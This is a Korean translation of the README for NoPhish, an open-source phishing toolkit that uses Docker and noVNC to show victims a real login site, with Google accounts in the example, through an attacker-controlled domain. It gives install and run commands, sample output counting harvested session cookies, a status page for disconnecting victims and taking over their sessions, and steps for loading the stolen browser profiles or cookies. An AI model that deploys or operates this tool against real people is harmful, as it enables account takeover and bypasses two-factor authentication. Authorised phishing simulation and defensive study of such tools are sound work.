# NoPhish
 
또 다른 피싱 툴킷으로, 도커와 noVNC 기반 인프라를 제공합니다. 전체 설정은 [mrd0x](https://mrd0x.com/bypass-2fa-using-novnc/)와 [fhlipzero](https://fhlipzero.io/blogs/6_noVNC/noVNC.html)의 초기 글을 기반으로 합니다.

설정에 대한 자세한 설명은 여기에서 확인할 수 있습니다 - [Another phishing tool](https://powerseb.github.io/posts/Another-phishing-tool/)

## 설치

도커가 설치되어 있고 정상 작동하는지 확인하세요.

필요한 파이썬 모듈을 설치합니다:

```console
pip install lz4
```
설치를 진행합니다 (필요한 도커 이미지를 생성합니다):


```console
setup.sh install
```

## 실행

설정은 다음과 같은 매개변수를 제공합니다:

```console
Usage: ./setup.sh -u No. Users -d Domain -t Target
         -u Number of users - please note for every user a container is spawned so don't go crazy
         -d Domain which is used for phishing
         -t Target website which should be displayed for the user
         -e Export format
         -s true / false if ssl is required - if ssl is set crt and key file are needed
         -c Full path to the crt file of the ssl certificate
         -k Full path to the key file of the ssl certificate
         -a Adjust default user agent string
         -z Compress profile to zip - will be ignored if parameter -e is set
         -p Additional URL parameters - if not set generic URL will be generated

```
기본 실행은 다음과 같습니다:


```console
./setup.sh -u 4 -t https://accounts.google.com -d hello.local 
```
실행 중에 다음 개요는 URL별로 수집된 쿠키 또는 세션 정보의 수를 상태로 제공합니다.


```console
...
[-] Starting Loop to collect sessions and cookies from containers
    Every 60 Seconds Cookies and Sessions are exported - Press [CTRL+C] to stop..
For the url http://hello.local/v1/oauth2/authorize?access-token=b6f13b93-1b51-41c4-b8b4-b07932a45bd6 :
-  0  cookies have been collected.
-  5  session cookies have been collected.
For the url http://hello.local/v2/oauth2/authorize?access-token=fd54dbec-c057-4f46-8657-c0283e5661d9 :
-  0  cookies have been collected.
-  5  session cookies have been collected.
For the url http://hello.local/v3/oauth2/authorize?access-token=9d606939-b805-4c65-9e98-2624de2cd431 :
-  0  cookies have been collected.
-  5  session cookies have been collected.
For the url http://hello.local/v4/oauth2/authorize?access-token=84b8d725-7e87-439e-8629-53332092b68f :
-  0  cookies have been collected.
-  5  session cookies have been collected.
```
도구는 성공적인 로그인과 관련이 없더라도 모든 쿠키 / 세션 정보를 내보낸다는 점에 유의하십시오.

또한 상태 페이지 - `http(s)://%DOMAIN%:65534/status.php` 에서 도구와 직접 상호작용할 수 있습니다. 거기서 사용자를 연결 해제하고 세션을 직접 인수할 수 있는 기능이 있습니다.

현재 버전의 도구에서는 모든 사용자에 대해 두 개의 컨테이너가 생성됩니다 - 하나는 데스크톱용, 하나는 모바일 기기용입니다. 사용자 에이전트에 따라 대상이 적합한 컨테이너로 리디렉션됩니다. 모바일 컨테이너의 출력은 앞에 "m"이 붙은 이름으로 표시됩니다 (예: mphis1-ffprofile).

## 프로필 내보내기 사용법
전체 FireFox 프로필 내보내기를 사용하는 경우, 다음과 같이 -profile 옵션으로 firefox를 호출하면 됩니다:

Windows에서:
`& 'C:\Program Files\Mozilla Firefox\firefox.exe' -profile <PathToProfile>\phis1-ffprofile\`

Linux에서:
`firefox-esr -profile <PathToProfile>/phis1-ffprofile --allow-downgrade`

최신 사이트를 포함한 모든 항목이 복원됩니다.

기본적으로는 zip 아카이브를 추출하거나 `-z` 매개변수를 `false`로 설정해야 한다는 점에 유의하십시오. 내보내기 형식으로 `-e simple`을 선택하면 두 개의 json 파일이 생성되며, 이는 [Firefox](https://addons.mozilla.org/de/firefox/addon/cookiebro/) 및 [Chrome](https://chrome.google.com/webstore/detail/cookiebro/lpmockibcakojclnfmhchibmdpmollgn)용으로 제공되는 Cookiebro와 함께 사용할 수 있습니다.

## 정리

실행 중 스크립트는 `ctrl` + `c`로 종료할 수 있으며, 이때 실행 중인 모든 도커 컨테이너가 삭제됩니다. 설정을 완전히 제거하려면 `setup.sh cleanup`을 실행하십시오.




---

Tranlated By [Open Ai Tx](https://github.com/OpenAiTx/OpenAiTx) | Last indexed: 2025-07-29

---